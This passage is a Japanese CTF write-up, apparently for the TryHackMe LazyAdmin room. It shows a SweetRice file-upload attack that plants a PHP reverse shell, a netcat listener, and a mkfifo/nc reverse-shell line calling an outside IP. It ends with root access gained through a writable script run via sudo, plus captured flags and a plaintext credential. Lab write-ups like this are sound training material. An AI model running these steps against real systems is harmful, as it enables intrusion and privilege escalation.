+<p>この部分からtargetURLとusernameとpasswordと任意ファイルが必要であることが分かる<br>
+Exampleに<code>shell.php5</code>とある<br>
+また</p>
+<pre><code class="language-python">uploadfile = r.post('http://' + host + '/as/?type=media_center&amp;mode=upload', files=file)
+</code></pre>
+<p>この部分からアップロードするのは<code>media_center</code>であることも分かる<br>
+このページの存在はGUIから確認済</p>
+<p>では任意ファイルを作成する<br>
+ここで狙うことは当たり前にリバースシェルの作成だ<br>
+phpでリバースシェルと言えば<code>pentestmonkey</code>のリバースシェルコードを使う方法である<br>
+これは<code>/usr/share/webshells/php/php-reverse-shell.php</code>にすでに入っているのでコピーしてきて使う<br>
+コードの中を見ると</p>
+<pre><code class="language-php">set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+</code></pre>
+<p>とあるのでここを自分のもの変えればよい<br>
+変更はカレントディレクトリにコピーしてから行う</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php5   
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ ls
+40716.py  hash.txt  mysql_bakup_20191129023059-1.5.1.sql  shell.php5
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ 
+</code></pre>
+<p>リスナーを起動</p>
+<pre><code class="language-bash">──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nc -lvnp 1234                   
+listening on [any] 1234 ...
+</code></pre>
+<p><code>python 40716.py</code>で実行する</p>
+<pre><code class="language-bash">
++-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
+|  _________                      __ __________.__                  |
+| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
+| \_____  \ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
+| /        \     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
+|/_______  / \/\_/  \___  &gt;\___  &gt;__| |____|_  /__|\___  &gt;___  &gt;    |
+|        \/             \/     \/            \/        \/    \/     |
+|    &gt; SweetRice 1.5.1 Unrestricted File Upload                     |
+|    &gt; Script Cod3r : Ehsan Hosseini                                |
++-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
+
+Enter The Target URL(Example : localhost.com) : http://10.49.169.227/content
+</code></pre>
+<p>まずURLを求められた。pythonコードを見ると</p>
+<pre><code class="language-python">uploadfile = r.post('http://' + host + '/as/?type=media_center&amp;mode=upload', files=file)
+</code></pre>
+<p>とあるので<code>/as/</code>以下はいれなくてよい</p>
+<p>と、進めたけどめっちゃエラー吐いてワロタ</p>
+<pre><code class="language-bash">Enter The Target URL(Example : localhost.com) : http://10.49.169.227/content    
+Enter Username : manager
+Enter Password : Password123
+Enter FileName (Example:.htaccess,shell.php5,index.html) : shell.php5
+Traceback (most recent call last):
+  File &quot;/usr/lib/python3/dist-packages/urllib3/connection.py&quot;, line 204, in _new_conn
+    sock = connection.create_connection(
+        (self._dns_host, self.port),
+    ...&lt;2 lines&gt;...
+        socket_options=self.socket_options,
+    )
+  File &quot;/usr/lib/python3/dist-packages/urllib3/util/connection.py&quot;, line 60, in create_connection
+    for res in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):
+               ~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3.13/socket.py&quot;, line 977, in getaddrinfo
+    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
+               ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+socket.gaierror: [Errno -2] Name or service not known
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File &quot;/usr/lib/python3/dist-packages/urllib3/connectionpool.py&quot;, line 787, in urlopen
+    response = self._make_request(
+        conn,
+    ...&lt;10 lines&gt;...
+        **response_kw,
+    )
+  File &quot;/usr/lib/python3/dist-packages/urllib3/connectionpool.py&quot;, line 493, in _make_request
+    conn.request(
+    ~~~~~~~~~~~~^
+        method,
+        ^^^^^^^
+    ...&lt;6 lines&gt;...
+        enforce_content_length=enforce_content_length,
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+    )
+    ^
+  File &quot;/usr/lib/python3/dist-packages/urllib3/connection.py&quot;, line 500, in request
+    self.endheaders()
+    ~~~~~~~~~~~~~~~^^
+  File &quot;/usr/lib/python3.13/http/client.py&quot;, line 1353, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3.13/http/client.py&quot;, line 1113, in _send_output
+    self.send(msg)
+    ~~~~~~~~~^^^^^
+  File &quot;/usr/lib/python3.13/http/client.py&quot;, line 1057, in send
+    self.connect()
+    ~~~~~~~~~~~~^^
+  File &quot;/usr/lib/python3/dist-packages/urllib3/connection.py&quot;, line 331, in connect
+    self.sock = self._new_conn()
+                ~~~~~~~~~~~~~~^^
+  File &quot;/usr/lib/python3/dist-packages/urllib3/connection.py&quot;, line 211, in _new_conn
+    raise NameResolutionError(self.host, self, e) from e
+urllib3.exceptions.NameResolutionError: HTTPConnection(host='http', port=80): Failed to resolve 'http' ([Errno -2] Name or service not known)
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File &quot;/usr/lib/python3/dist-packages/requests/adapters.py&quot;, line 644, in send
+    resp = conn.urlopen(
+        method=request.method,
+    ...&lt;9 lines&gt;...
+        chunked=chunked,
+    )
+  File &quot;/usr/lib/python3/dist-packages/urllib3/connectionpool.py&quot;, line 841, in urlopen
+    retries = retries.increment(
+        method, url, error=new_e, _pool=self, _stacktrace=sys.exc_info()[2]
+    )
+  File &quot;/usr/lib/python3/dist-packages/urllib3/util/retry.py&quot;, line 535, in increment
+    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]
+    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='http', port=80): Max retries exceeded with url: /10.49.169.227/content/as/?type=signin (Caused by NameResolutionError(&quot;HTTPConnection(host='http', port=80): Failed to resolve 'http' ([Errno -2] Name or service not known)&quot;))                              
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File &quot;/home/rkametani/tryhackme/lazyAdmin/40716.py&quot;, line 52, in &lt;module&gt;
+    login = r.post('http://' + host + '/as/?type=signin', data=payload)
+  File &quot;/usr/lib/python3/dist-packages/requests/sessions.py&quot;, line 637, in post
+    return self.request(&quot;POST&quot;, url, data=data, json=json, **kwargs)
+           ~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File &quot;/usr/lib/python3/dist-packages/requests/sessions.py&quot;, line 589, in request
+    resp = self.send(prep, **send_kwargs)
+  File &quot;/usr/lib/python3/dist-packages/requests/sessions.py&quot;, line 703, in send
+    r = adapter.send(request, **kwargs)
+  File &quot;/usr/lib/python3/dist-packages/requests/adapters.py&quot;, line 677, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='http', port=80): Max retries exceeded with url: /10.49.169.227/content/as/?type=signin (Caused by NameResolutionError(&quot;HTTPConnection(host='http', port=80): Failed to resolve 'http' ([Errno -2] Name or service not known)&quot;))                           
+
+┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/lazyAdmin]
+└─$ 
+</code></pre>
+<p>ふつうにGUIからアップロードしよかな</p>
+<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+└─$ nc -lvnp 1234                   
+listening on [any] 1234 ...
+connect to [192.168.205.211] from (UNKNOWN) [10.49.169.227] 32880
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 07:24:56 up  4:29,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ 
+</code></pre>
+<p>普通に入れた<br>
+なにがアカンかったんやろ</p>
+<pre><code class="language-bash">$ ls 
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+$ cd home
+$ pwd
+/home
+$ ls
+itguy
+$ cd itguy
+$ pwd
+/home/itguy
+$ ls
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+backup.pl
+examples.desktop
+mysql_login.txt
+user.txt
+$ cat user.txt
+THM{63e5bce9271952aad1113b6f1ac28a07}
+$ cat mysql_login.txt
+rice:randompass
+$ 
+</code></pre>
+<p><code>user.txt</code>と<code>mysql_login.txt</code>を発見した</p>
+<p>「<code>user.txt</code>と<code>mysql_login.txt</code>発見した！」ってAIに聞いたら<br>
+mysqlのログイン情報は権限昇格に関係なさそうで<code>backup.pl</code>は使いそうだね。って言われた</p>
+<pre><code class="language-bash">$ cat backup.pl
+#!/usr/bin/perl
+
+system(&quot;sh&quot;, &quot;/etc/copy.sh&quot;);
+$ ls -la
+total 148
+drwxr-xr-x 18 itguy itguy 4096 Nov 30  2019 .
+drwxr-xr-x  3 root  root  4096 Nov 29  2019 ..
+-rw-------  1 itguy itguy 1630 Nov 30  2019 .ICEauthority
+-rw-------  1 itguy itguy   53 Nov 30  2019 .Xauthority
+lrwxrwxrwx  1 root  root     9 Nov 29  2019 .bash_history -&gt; /dev/null
+-rw-r--r--  1 itguy itguy  220 Nov 29  2019 .bash_logout
+-rw-r--r--  1 itguy itguy 3771 Nov 29  2019 .bashrc
+drwx------ 13 itguy itguy 4096 Nov 29  2019 .cache
+drwx------ 14 itguy itguy 4096 Nov 29  2019 .config
+drwx------  3 itguy itguy 4096 Nov 29  2019 .dbus
+-rw-r--r--  1 itguy itguy   25 Nov 29  2019 .dmrc
+drwx------  2 itguy itguy 4096 Nov 29  2019 .gconf
+drwx------  3 itguy itguy 4096 Nov 30  2019 .gnupg
+drwx------  3 itguy itguy 4096 Nov 29  2019 .local
+drwx------  5 itguy itguy 4096 Nov 29  2019 .mozilla
+-rw-------  1 itguy itguy  149 Nov 29  2019 .mysql_history
+drwxrwxr-x  2 itguy itguy 4096 Nov 29  2019 .nano
+-rw-r--r--  1 itguy itguy  655 Nov 29  2019 .profile
+-rw-r--r--  1 itguy itguy    0 Nov 29  2019 .sudo_as_admin_successful
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-clipboard.pid
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-display.pid
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-draganddrop.pid
+-rw-r-----  1 itguy itguy    5 Nov 30  2019 .vboxclient-seamless.pid
+-rw-------  1 itguy itguy   82 Nov 30  2019 .xsession-errors
+-rw-------  1 itguy itguy   82 Nov 29  2019 .xsession-errors.old
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Desktop
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Documents
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Downloads
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Music
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Pictures
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Public
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Templates
+drwxr-xr-x  2 itguy itguy 4096 Nov 29  2019 Videos
+-rw-r--r-x  1 root  root    47 Nov 29  2019 backup.pl
+-rw-r--r--  1 itguy itguy 8980 Nov 29  2019 examples.desktop
+-rw-rw-r--  1 itguy itguy   16 Nov 29  2019 mysql_login.txt
+-rw-rw-r--  1 itguy itguy   38 Nov 29  2019 user.txt
+$ 
+</code></pre>
+<p><code>ls- la</code>したら<code>backup.pl</code>がotherで実行可能になってることが分かった</p>
+<pre><code class="language-bash">$ sudo -l
+Matching Defaults entries for www-data on THM-Chal:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+$ 
+</code></pre>
+<p><code>sudo -l</code>もやってみるとおあつらえ向きの結果が出た<br>
+sudoをノーパスでperlと<code>/home/itguy/backup.pl</code>実行できるらしい<br>
+コードの中身を見てみる</p>
+<pre><code class="language-bash">$ cat backup.pl
+#!/usr/bin/perl
+
+system(&quot;sh&quot;, &quot;/etc/copy.sh&quot;);
+</code></pre>
+<p>これは<code>/etc/copy.sh</code>を呼び出しているだけ<br>
+これ自身の中身を書き換えられないだろうか？</p>
+<pre><code class="language-bash">$ ls -ls /etc/copy.sh
+4 -rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
+</code></pre>
+<p>書き換え可能だった<br>
+中身を見てみる</p>
+<pre><code class="language-bash">$ cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.0.190 5554 &gt;/tmp/f
+$ 
+</code></pre>
+<p>こわれたリバースシェルが入っている<br>
+たとえばここにシェルの起動コマンドを入れて<code>backup.pl</code>を動かせば<br>
+<code>sudo -l</code>の結果からroot権限でシェルが起動できることにならないか？<br>
+やってみる</p>
+<pre><code class="language-bash">$ echo '/bin/bash' &gt; /etc/copy.sh
+$ cat /etc/copy.sh
+/bin/bash
+$ sudo /usr/bin/perl /home/itguy/backup.pl
+
+
+
+
+^C
+/bin/bash: line 5: ^C: command not found
+whoami
+root
+
+cat /root/root.txt
+THM{6637f41d0177b6f37cb20d775124699f}
+
+
+</code></pre>
+<p>とれて草</p>
+<p>おわり</p>
+    </article>
+  </main>
+
+  <footer>
+    <p>Educational CTF writeup for <a href="https://tryhackme.com/room/lazyadmin">https://tryhackme.com/room/lazyadmin</a></p>
+  </footer>
+</body>
+</html>
